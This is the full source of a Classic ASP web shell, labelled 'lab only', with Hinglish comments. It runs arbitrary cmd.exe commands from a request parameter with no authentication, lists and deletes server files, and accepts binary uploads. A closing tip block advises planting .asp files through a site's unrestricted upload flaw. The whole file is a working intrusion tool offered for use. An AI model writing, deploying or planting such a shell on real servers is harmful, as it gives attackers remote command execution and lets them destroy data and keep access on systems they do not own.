<%@ Language=VBScript %>
<%
' NO PASSWORD - DIRECT ACCESS (LAB ONLY - DANGEROUS ON REAL SERVER)

On Error Resume Next  ' Errors ko handle karne ke liye

Dim objFSO, objShell
Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
Set objShell = Server.CreateObject("WScript.Shell")

Dim strPath : strPath = Request("path")
If strPath = "" Then strPath = Server.MapPath(".")

Dim strAction : strAction = Request("act")

' CMD EXECUTE
If strAction = "cmd" Then
    Dim strCmd : strCmd = Request("cmd")
    If strCmd <> "" Then
        Dim objExec, strOutput
        Set objExec = objShell.Exec("cmd.exe /c " & strCmd)
        strOutput = objExec.StdOut.ReadAll & objExec.StdErr.ReadAll
        Response.Write "<pre style='color:#0f0;background:#111;padding:15px;border:1px solid #0f0;'>" & Server.HTMLEncode(strOutput) & "</pre><br>"
    End If
End If

' DELETE
If strAction = "del" Then
    Dim strFile : strFile = Request("file")
    If objFSO.FileExists(strFile) Then
        objFSO.DeleteFile strFile
        Response.Write "<div style='color:lime;font-weight:bold;'>Deleted: " & Server.HTMLEncode(strFile) & "</div><br>"
    Else
        Response.Write "<div style='color:red;font-weight:bold;'>File not found!</div><br>"
    End If
End If

' UPLOAD (Basic attempt - multipart issue ke bawajood try)
If strAction = "upload" Then
    Response.Write "<div style='background:#222;color:yellow;padding:15px;border:1px solid yellow;'>"
    Response.Write "Upload attempt in progress...<br>"
    
    If Request.TotalBytes > 0 Then
        Response.Write "Bytes received: " & Request.TotalBytes & "<br>"
        
        Dim Stream
        Set Stream = Server.CreateObject("ADODB.Stream")
        If Err.Number <> 0 Then
            Response.Write "<b style='color:red;'>Error: ADODB.Stream not available (server restriction?)</b><br>"
        Else
            Stream.Type = 1 ' Binary
            Stream.Open
            Stream.Write Request.BinaryRead(Request.TotalBytes)
            Stream.Position = 0
            
            ' Crude save - filename extract nahi, fixed name se save (lab test ke liye)
            Dim timestamp : timestamp = Year(Now)&Month(Now)&Day(Now)&Hour(Now)&Minute(Now)&Second(Now)
            Dim SavePath : SavePath = strPath & "\uploaded_" & timestamp & ".bin"  ' .bin ya extension change kar sakte ho
            
            Stream.SaveToFile SavePath, 2 ' Overwrite if exists
            If Err.Number = 0 Then
                Response.Write "<b style='color:lime;'>File saved to: " & SavePath & "</b><br>"
            Else
                Response.Write "<b style='color:red;'>Save failed: " & Err.Description & " (check folder write permission)</b><br>"
            End If
            Stream.Close
        End If
    Else
        Response.Write "No file data received in POST."
    End If
    Response.Write "</div><br>"
End If
%>

<html>
<head><title>Classic ASP Open Shell - Lab Only</title></head>
<body style="font-family:consolas;background:#000;color:#0f0;margin:20px;">

<h2>Classic ASP File Manager + CMD Shell (No Auth)</h2>
<p>Current Dir: <%=Server.HTMLEncode(strPath)%> | User: <%=objShell.ExpandEnvironmentStrings("%USERNAME%")%></p>

<form method="get">
    Path: <input name="path" value="<%=Server.HTMLEncode(strPath)%>" size="80">
    <input type="submit" value="Browse">
</form>

<h3>Listing</h3>
<%
If objFSO.FolderExists(strPath) Then
    Dim folder : Set folder = objFSO.GetFolder(strPath)
    For Each subf In folder.SubFolders
        Response.Write "[DIR] <a href='?path=" & Server.URLEncode(subf.Path) & "' style='color:#ff0;'>" & subf.Name & "</a><br>"
    Next
    Response.Write "<hr style='border-color:#333;'>"
    For Each file In folder.Files
        Dim fpath : fpath = Server.URLEncode(file.Path)
        Response.Write file.Name & " (" & file.Size & " bytes) | "
        Response.Write "<a href='?act=del&file=" & fpath & "' style='color:red;' onclick='return confirm(""Sure delete?"");'>DEL</a><br>"
    Next
Else
    Response.Write "<span style='color:red;'>Invalid path!</span>"
End If
%>

<h3>CMD Execute</h3>
<form method="get">
    <input type="hidden" name="act" value="cmd">
    <input name="cmd" size="90" value="whoami"><br>
    <input type="submit" value="Run">
</form>

<h3>Upload (Basic - may fail due to classic ASP limits)</h3>
<form method="post" enctype="multipart/form-data" action="?act=upload&path=<%=Server.URLEncode(strPath)%>">
    <input type="file" name="file"><br><br>
    <input type="submit" value="Upload">
</form>

<p style="color:#ff0;">
    <b>Upload issue fix tips:</b><br>
    1. Agar "Save failed: Permission denied" → folder mein write permission nahi (IIS user/IUSR ko allow kar lab mein).<br>
    2. Agar ADODB.Stream error → server pe disabled hai (common restriction).<br>
    3. **Best lab workaround**: Upload mat try shell se — lab ke **original unrestricted file upload** feature se .asp/.txt file daal, phir yahan se browse/delete kar.<br>
    4. Full reliable upload chahiye? Motobit Pure ASP Upload script add kar (free): https://www.motobit.com/help/scptutl/pure-asp-upload.htm — woh include kar ke code improve kar sakte ho.
</p>

</body>
</html>

<%
Set objFSO = Nothing
Set objShell = Nothing
%>
